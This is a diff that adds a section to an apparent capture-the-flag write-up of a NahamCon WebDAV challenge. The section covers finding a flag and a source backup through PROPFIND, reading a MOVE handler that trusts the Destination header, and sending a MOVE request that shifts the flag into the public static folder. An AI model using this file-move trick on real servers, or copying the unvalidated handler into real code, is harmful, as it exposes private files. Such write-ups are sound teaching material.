@@ -82,3 +82,49 @@ Using Postman to send a PROPFIND request returns this:
     </D:response>
 </D:multistatus>
 ```
+
+Exploring the filesystem, there are some files of interest:
+```
+/the_secret_dav_inci_code/flag.txt
+/static/app.py.backup
+```
+
+The backup file gives us access to the server source code. See `app-backup.py`. We see that the server serves us any file we request for in the `/static/` directory.
+
+```python
+@app.route('/static/<path:filename>')
+def static_files(filename):
+    return send_from_directory('static', filename)
+```
+
+
+We also find out an API that manages MOVE requests. The request moves a file from a source path (defined in the request parameter) to a destination path  (defined in the "Destination" header).
+
+```python
+@app.route('/<path:path>', methods=['GET', 'PROPFIND', 'MOVE'])
+def handle_webdav(path):
+    full_path = os.path.join(os.getcwd(), path)
+    if request.method == 'PROPFIND':
+        ...
+        ...
+    elif request.method == 'MOVE':
+        destination = request.headers.get('Destination')
+        if destination:
+            destination_path = os.path.join(os.getcwd(), destination.strip('/'))
+            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+            shutil.move(full_path, destination_path)
+            return Response(status=204)
+        abort(405)
+    abort(404)
+```
+
+Constructing a request to move the flag file to `/static/`:
+
+```
+MOVE http://challenge.nahamcon.com:31228/the_secret_dav_inci_code/flag.txt
+
+<Standard headers>
+Destination: static
+```
+
+Visit `http://challenge.nahamcon.com:31228/static/flag.txt` to get the flag.
